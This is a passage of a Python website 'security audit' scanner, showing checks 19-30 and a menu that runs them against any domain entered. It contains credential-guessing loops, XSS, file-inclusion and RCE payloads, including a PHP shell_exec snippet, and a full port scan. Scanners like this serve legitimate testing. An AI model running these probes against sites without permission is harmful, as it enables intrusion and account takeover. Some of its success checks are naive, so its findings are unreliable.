    # Define a list of common default username-password combinations
    default_credentials = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('root', 'root'),
        ('admin', '1234'),
        ('user', 'user'),
        ('guest', 'guest'),
        ('test', 'test'),
        ('admin', 'welcome'),
        ('administrator', 'admin123'),
        ('root', 'toor'),
        # Add more default credentials as needed
    ]

    # Create a session for persistent connections
    session = requests.Session()

    # Try each default username-password combination
    for username, password in default_credentials:
        data = {username_field: username, password_field: password}

        try:
            # Send the login request with the default credentials
            response = session.post(login_url, data=data, timeout=5)

            # Check for successful login (example: checking for a redirect or success message)
            if "Welcome" in response.text or response.status_code == 200:
                print(f"Success: Default credentials found: Username: {username}, Password: {password}")
                return (username, password)  # Return successful default credentials
            else:
                print(f"Failed attempt with default credentials: Username: {username}, Password: {password}")

        except requests.RequestException as e:
            print(f"Error during default credentials check: {e}")

    print("[-] No default credentials found.")
    return None


# List of known phishing domains (you can extend this list or get it from a public API)
phishing_domains = [
    "example-phishing.com",
    "malicious-website.xyz",
    "fakebank.com",
    "bank-login.net",
    "paypal-login.xyz",
    "secure-login.com",
    "google-security-update.com",
    "microsoft-supports.com",
    "icloud-supports.net",
    "amazon-verification.com",
    "facebook-login.net",
    "twitter-update.com",
    "yahoo-login.net",
    "account-security-verify.com",
    "secure-banking-info.com",
    "online-shopping-support.com",
    "delivery-status-update.com",
    "email-security-update.com",
    "apple-supports.net",
    "google-mail-supports.com",
    "update-your-info.com",
    "invoice-payment-confirm.com"

]


# Check if a URL is suspicious or matches known phishing domains
def check_phishing_url(domain):
    print(f"[+] Checking for phishing URLs for {domain}...")

    # Check if the domain itself is a known phishing domain
    if domain in phishing_domains:
        print(f"[-] Warning: The domain {domain} is known for phishing!")
        return True

    # Try to detect suspicious redirects (example: to known phishing domains)
    try:
        response = requests.get(f"http://{domain}", timeout=5, allow_redirects=True)

        # Check the final URL after all redirects
        final_url = response.url
        print(f"Final URL after redirects: {final_url}")

        # Check if the final URL matches a known phishing domain
        for phishing_domain in phishing_domains:
            if phishing_domain in final_url:
                print(f"[-] Warning: The domain redirects to a known phishing site: {phishing_domain}")
                return True

        print("[+] No obvious phishing URL detected.")

    except requests.RequestException as e:
        print(f"Error checking phishing URL for {domain}: {e}")

    return False


# 21. XSS Payload Check
def check_xss_payload(domain):
    print(f"[+] Checking for XSS payloads for {domain}...")

    # Common XSS payloads (testing multiple types of XSS vectors)
    payloads = [
        "<img src=x onerror=alert('XSS')>",
        "<script>alert('XSS')</script>",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<a href='javascript:alert(\"XSS\")'>Click Me</a>",
        "<input type='text' value='<script>alert(1)</script>'>",
        "<div onmouseover=alert('XSS')>Hover me</div>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<marquee behavior='alternate' onstart=alert('XSS')>Test</marquee>",
        "<object data='javascript:alert(1)'></object>"
    ]

    # Testing different URL parameters and paths
    test_urls = [
        f"http://{domain}/?q=",
        f"http://{domain}/?id=",
        f"http://{domain}/?page=",
        f"http://{domain}/search?q=",
        f"http://{domain}/product?id="
    ]

    # Test each URL with all payloads
    for url in test_urls:
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if payload in response.text:
                    print(f"XSS vulnerability found at {test_url}")
            except requests.RequestException as e:
                print(f"Error checking XSS at {test_url}: {e}")


# 22. Content-Type Header Check
def check_content_type_header(domain):
    print(f"[+] Checking Content-Type header for {domain}...")

    try:
        response = requests.get(f"http://{domain}", timeout=5)

        # Check if Content-Type header is present
        if 'Content-Type' not in response.headers:
            print("Warning: Missing Content-Type header!")
        else:
            content_type = response.headers['Content-Type']
            print(f"Content-Type header: {content_type}")

            # Validate Content-Type header to ensure proper usage
            if 'text/html' in content_type:
                print("Content-Type is correctly set for HTML content.")
            elif 'application/json' in content_type:
                print("Content-Type is correctly set for JSON content.")
            elif 'application/xml' in content_type:
                print("Content-Type is correctly set for XML content.")
            else:
                print("Content-Type may not be properly set. Please review the server's configuration.")

            # Check for potential security concerns
            if 'application/x-www-form-urlencoded' in content_type:
                print(
                    "Warning: Application/x-www-form-urlencoded detected. Ensure proper validation and sanitization of input.")

            if 'multipart/form-data' in content_type:
                print("Warning: multipart/form-data detected. Ensure proper handling of file uploads.")

    except requests.RequestException as e:
        print(f"Error checking Content-Type header: {e}")


# 23. File Inclusion Check
def check_file_inclusion(domain):
    print(f"[+] Checking for file inclusion vulnerabilities for {domain}...")

    # List of potential attack payloads to test for file inclusion vulnerabilities
    test_urls = [
        f"http://{domain}/?page=../../../../etc/passwd",  # Basic file inclusion payload
        f"http://{domain}/?page=php://input",  # Check for PHP input stream inclusion
        f"http://{domain}/?page=php://filter/read=string.toupper/resource=index.php",  # Filter inclusion
        f"http://{domain}/?page=../../../../var/log/apache2/access.log",  # Log file inclusion
        f"http://{domain}/?page=php://memory",  # Check for memory inclusion vulnerability
        f"http://{domain}/?page=file:///etc/hostname",  # Local file inclusion (LFI)
    ]

    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)

            # Check for known sensitive data in the response, like '/etc/passwd' contents
            if "root:x" in response.text:
                print(f"File Inclusion vulnerability found at: {url}")

            # Check for other signs of file inclusion
            elif "php://" in url and "Warning" in response.text:
                print(f"Possible PHP stream file inclusion vulnerability found at: {url}")

            elif "file://" in url and "No such file" not in response.text:
                print(f"Potential Local File Inclusion (LFI) found at: {url}")

            else:
                print(f"No file inclusion vulnerability found at: {url}")

        except requests.RequestException as e:
            print(f"Error checking file inclusion at {url}: {e}")


# 24. Session Fixation Check
def check_session_fixation(domain):
    print(f"[+] Checking for session fixation vulnerabilities for {domain}...")

    # Test URLs to check if session fixation is possible
    test_urls = [
        f"http://{domain}/login",  # Login page URL
        f"http://{domain}/dashboard",  # Dashboard or post-login URL
    ]

    # Test cases to simulate session fixation
    session_id = "testsessionid12345"  # Fake session ID to test with

    for url in test_urls:
        try:
            # Set a custom session cookie and make a request
            cookies = {"PHPSESSID": session_id}
            response = requests.get(url, cookies=cookies, timeout=5)

            # Check if the session ID in the response is the same as the one set
            if 'PHPSESSID' in response.cookies and response.cookies['PHPSESSID'] == session_id:
                print(f"Session fixation vulnerability found at {url}: Session ID not changed")
            else:
                print(f"No session fixation vulnerability found at {url}: Session ID is properly managed")

        except requests.RequestException as e:
            print(f"Error checking session fixation at {url}: {e}")


# 25. Password Strength Check
def check_password_strength(domain):
    print(f"[+] Checking for weak passwords at {domain}...")

    # List of common weak passwords to test
    weak_passwords = [
        "password123",
        "123456",
        "qwerty",
        "letmein",
        "admin",
        "12345",
        "welcome",
        "password",
        "123123",
        "abc123"
    ]

    # Common username list (this could be expanded or retrieved dynamically)
    usernames = [
        "admin",
        "user",
        "test",
        "root",
        "guest",
        "administrator"
    ]

    # Loop through each username and weak password combination to test
    for username in usernames:
        for password in weak_passwords:
            try:
                # Simulate a login attempt
                response = requests.post(
                    f"http://{domain}/login",
                    data={'username': username, 'password': password},
                    timeout=5
                )

                # Check if the login attempt was successful (e.g., redirected to dashboard)
                if "dashboard" in response.url or "Welcome" in response.text:
                    print(f"Weak password found: {password} for username: {username} on {domain}")
                else:
                    print(f"Login failed for {username} with password {password}")

            except requests.RequestException as e:
                print(f"Error checking password strength for {username}: {e}")


# 26. RCE (Remote Code Execution) Check
def check_rce(domain):
    print(f"[+] Checking for RCE vulnerabilities at {domain}...")

    # List of possible vulnerable endpoints to test
    test_urls = [
        f"http://{domain}/?cmd=ls",  # Command execution via GET parameter
        f"http://{domain}/?input=system('ls')",  # Command injection attempt
        f"http://{domain}/?data=<?php echo shell_exec($_GET['cmd']); ?>",  # Common RCE payload
        f"http://{domain}/upload.php?file=evil.php",  # File upload vulnerability
        f"http://{domain}/vulnerable-endpoint",  # Placeholder for endpoint that could be tested
    ]

    # Common RCE payloads
    rce_payloads = [
        "echo 'RCE' > test.txt",  # Simple command injection
        "phpinfo();",  # PHP code execution
        "system('ls')",  # Trying to list directory contents
        "exec('ls')",  # Another shell execution example
        "os.system('ls')",  # Python-based RCE payload
    ]

    # Try RCE payloads on different URLs
    for url in test_urls:
        for payload in rce_payloads:
            try:
                # Inject payload into the URL or parameter
                test_url = f"{url}&cmd={payload}"  # Example of appending the payload to a query string
                response = requests.get(test_url, timeout=5)

                # Check if payload was executed (e.g., check for output in response)
                if "RCE" in response.text or "ls" in response.text or "phpinfo" in response.text:
                    print(f"Possible RCE vulnerability found at {test_url}")
                else:
                    print(f"Payload did not execute successfully at {test_url}")

            except requests.RequestException as e:
                print(f"Error checking RCE at {test_url}: {e}")


# 27. Vulnerable Service Detection
def check_vulnerable_services(domain):
    print(f"[+] Checking for vulnerable services at {domain}...")

    # Initialize Nmap scanner
    nm = nmap.PortScanner()

    # Scan the domain for open ports
    try:
        print(f"[+] Scanning for open ports on {domain}...")
        nm.scan(domain, '1-65535')  # Scan all ports from 1 to 65535
        open_ports = []

        for proto in nm[domain].all_protocols():
            for port in nm[domain][proto].keys():
                state = nm[domain][proto][port]['state']
                if state == 'open':
                    open_ports.append((port, proto))

        if not open_ports:
            print(f"No open ports detected for {domain}.")
            return

        print(f"[+] Open ports detected on {domain}:")
        for port, proto in open_ports:
            print(f"  Port {port} ({proto}) is open.")

        # Check for vulnerable services based on port numbers
        vulnerable_services = {
            21: "FTP (Check for anonymous login or outdated versions)",
            22: "SSH (Check for weak passwords or outdated versions)",
            23: "Telnet (Insecure plaintext communication)",
            80: "HTTP (Check for outdated web applications, default configurations)",
            443: "HTTPS (Check for SSL/TLS vulnerabilities)",
            3306: "MySQL (Check for weak passwords, remote access)",
            3389: "RDP (Check for weak passwords, outdated RDP versions)",
            8080: "HTTP Proxy (Check for misconfigurations)",
            5900: "VNC (Check for weak passwords, outdated versions)"
        }

        # Analyze open ports for known vulnerabilities
        for port, proto in open_ports:
            if port in vulnerable_services:
                print(f"Possible vulnerable service detected on port {port}: {vulnerable_services[port]}")
            else:
                print(f"Port {port} is open, but no known vulnerabilities detected for this port.")

    except Exception as e:
        print(f"Error checking vulnerable services for {domain}: {e}")


# 28. SSL Pinning Check
def check_ssl_pinning(domain):
    print(f"[+] Checking for SSL pinning for {domain}...")

    try:
        # Fetch the SSL certificate of the domain
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                cert_details = ssl.DER_cert_to_PEM_cert(ssock.getpeercert_binary())

                # Display certificate details
                print(f"Certificate for {domain}:")
                print(f"  Issuer: {cert['issuer']}")
                print(f"  Subject: {cert['subject']}")
                print(f"  Not Before: {cert['notBefore']}")
                print(f"  Not After: {cert['notAfter']}")

                # Check if the cert contains pins or public keys (can be a sign of SSL pinning)
                try:
                    # OpenSSL's method for extracting public key
                    x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, cert_details)
                    pub_key = x509.get_pubkey()
                    print(f"  Public Key: {OpenSSL.crypto.dump_publickey(OpenSSL.crypto.FILETYPE_PEM, pub_key)}")
                except Exception as e:
                    print(f"Error extracting public key from cert: {e}")

                # Perform SSL pinning check (basic method)
                response = requests.get(f"https://{domain}", verify=True, timeout=5)
                if 'public-key-pins' in response.headers:
                    print(f"  SSL Pinning detected for {domain}. Public Key Pinning headers found.")
                else:
                    print(f"  No SSL Pinning detected for {domain}. No Public Key Pinning headers.")

                # If Public Key Pinning is found, check for its validity
                if 'public-key-pins' in response.headers:
                    print(f"  Public Key Pinning Header: {response.headers['public-key-pins']}")

    except Exception as e:
        print(f"Error checking SSL pinning for {domain}: {e}")


# 29. Subdomain Takeover Check
def check_subdomain_takeover(domain):
    print(f"[+] Checking for subdomain takeover at {domain}...")

    # Common services that are prone to subdomain takeovers
    takeover_services = [
        "github.io",  # GitHub Pages
        "s3.amazonaws.com",  # AWS S3 Bucket
        "cloudfront.net",  # AWS Cloudfront
        "herokuapp.com",  # Heroku
        "azurewebsites.net",  # Microsoft Azure
        "firebaseapp.com",  # Firebase Hosting
        "appspot.com",  # Google App Engine
        "bitbucket.org",  # Bitbucket Pages
        "netlify.com",  # Netlify
        "app.cloud"
    ]

    # Function to check if a subdomain is pointing to a takeover service
    def check_subdomain(subdomain):
        try:
            resolver = dns.resolver.Resolver()
            # Get the IP addresses for the subdomain
            answers = resolver.resolve(subdomain, 'A')
            for answer in answers:
                ip_address = answer.to_text()
                # Check if the IP is pointing to a known takeover service
                parsed_url = urlparse(f"http://{subdomain}")
                for service in takeover_services:
                    if service in parsed_url.netloc:
                        print(f"Possible subdomain takeover vulnerability detected at: {subdomain}")
                        break
        except dns.resolver.NoAnswer:
            print(f"No DNS record found for {subdomain}. Potential takeover opportunity.")
        except Exception as e:
            print(f"Error checking subdomain {subdomain}: {e}")

    # Attempt to get subdomains for the main domain
    try:
        subdomains = ["www", "blog", "dev", "staging", "admin", "test", "api", "shop", "portal",
                      "support"]  # Some common subdomains to check

        # Try each subdomain
        for subdomain in subdomains:
            full_subdomain = f"{subdomain}.{domain}"
            print(f"Checking subdomain: {full_subdomain}")
            check_subdomain(full_subdomain)

    except Exception as e:
        print(f"Error during subdomain takeover check: {e}")


# 30. Cloud Storage Bucket Exposure Check
def check_cloud_storage(domain):
    print(f"[+] Checking for exposed cloud storage at {domain}...")

    # List of cloud storage services to check for exposed buckets
    cloud_services = [
        "s3.amazonaws.com",  # AWS S3
        "storage.googleapis.com",  # Google Cloud Storage
        "blob.core.windows.net",  # Microsoft Azure Blob Storage
        "cdn.cloudflare.com",  # Cloudflare R2 Storage
        "files.wordpress.com",  # WordPress.com Media Files
    ]

    # Common bucket names (or patterns) to check for
    bucket_patterns = [
        f"public/{domain}",
        f"{domain}-bucket",
        f"{domain}-storage",
        f"files.{domain}",
        f"assets.{domain}",
        f"media.{domain}",
        f"{domain}-data",
        f"www.{domain}",
    ]

    # Function to check for exposed cloud storage buckets
    def check_bucket_exposure(bucket_url):
        try:
            response = requests.get(bucket_url, timeout=5)
            if response.status_code == 200:
                print(f"Exposed cloud storage bucket found at: {bucket_url}")
            else:
                print(f"Bucket at {bucket_url} is not exposed (Status Code: {response.status_code})")
        except requests.RequestException as e:
            print(f"Error checking bucket at {bucket_url}: {e}")

    # Iterate over cloud services and bucket patterns
    for service in cloud_services:
        for pattern in bucket_patterns:
            bucket_url = f"https://{pattern}.{service}"
            print(f"Checking bucket: {bucket_url}")
            check_bucket_exposure(bucket_url)


# Main function to control the menu and user selection
def main():
    banner()

    url = input("Enter the website domain (e.g., example.com or https://example.com): ").strip()
    parsed_url = urlparse(url)
    domain = parsed_url.netloc if parsed_url.netloc else parsed_url.path
    if domain.startswith("www."):
        domain = domain[4:]

    print(f"\nWebsite Security Audit for {domain}...\n")

    print("Select the security check you want to perform:")
    print("1. SSL Certificate Check")
    print("2. HTTP Header Security Check")
    print("3. Port Scan")
    print("4. SQL Injection Check")
    print("5. Cross-Site Scripting (XSS) Check")
    print("6. Directory Traversal Check")
    print("7. Sensitive File Exposure Check")
    print("8. Malware Scan (VirusTotal)")
    print("9. DNS Lookup")
    print("10. WHOIS Information")
    print("11. HTTP Security Check")
    print("12. SSL Vulnerability Tracking")
    print("13. HTTP Methods Check")
    print("14. SSL Weak Cipher Check")
    print("15. Open Redirect Check")
    print("16. Clickjacking Check")
    print("17. Subdomain Enumeration")
    print("18. Brute Force Login Check")
    print("19. Default Credentials Check")
    print("20. Phishing URL Check")
    print("21. XSS Payload Check")
    print("22. Content-Type Header Check")
    print("23. File Inclusion Check")
    print("24. Session Fixation Check")
    print("25. Password Strength Check")
    print("26. Remote Code Execution (RCE) Check")
    print("27. Vulnerable Service Detection")
    print("28. SSL Pinning Check")
    print("29. Subdomain Takeover Check")
    print("30. Cloud Storage Bucket Exposure Check")

    banner()
    choice = input("\nEnter your choice (1-30): ").strip()

    if choice == "1":
        check_ssl_certificate(domain)
    elif choice == "2":
        check_headers(domain)
    elif choice == "3":
        port_scan(domain)
    elif choice == "4":
        check_sql_injection(domain)
    elif choice == "5":
        check_xss(domain)
    elif choice == "6":
        check_directory_traversal(domain)
    elif choice == "7":
        check_sensitive_files(domain)
    elif choice == "8":
        scan_malware(domain)
    elif choice == "9":
        check_dns(domain)
    elif choice == "10":
        check_whois(domain)
    elif choice == "11":
        check_http_security(domain)
    elif choice == "12":
        track_ssl_vulnerabilities(domain)
    elif choice == "13":
        check_http_methods(domain)
    elif choice == "14":
        check_ssl_weak_ciphers(domain)
    elif choice == "15":
        check_open_redirect(domain)
    elif choice == "16":
        check_clickjacking(domain)
    elif choice == "17":
        enumerate_subdomains(domain)
    elif choice == "18":
        brute_force_login(domain)
    elif choice == "19":
        check_default_credentials(domain)
    elif choice == "20":
        check_phishing_url(domain)
    elif choice == "21":
        check_xss_payload(domain)
    elif choice == "22":
        check_content_type_header(domain)
    elif choice == "23":
        check_file_inclusion(domain)
    elif choice == "24":
        check_session_fixation(domain)
    elif choice == "25":
        check_password_strength(domain)
    elif choice == "26":
        check_rce(domain)
    elif choice == "27":
        check_vulnerable_services(domain)
    elif choice == "28":
        check_ssl_pinning(domain)
    elif choice == "29":
        check_subdomain_takeover(domain)
    elif choice == "30":
        check_cloud_storage(domain)
    else:
        print("Invalid choice!")


if __name__ == "__main__":
    main()
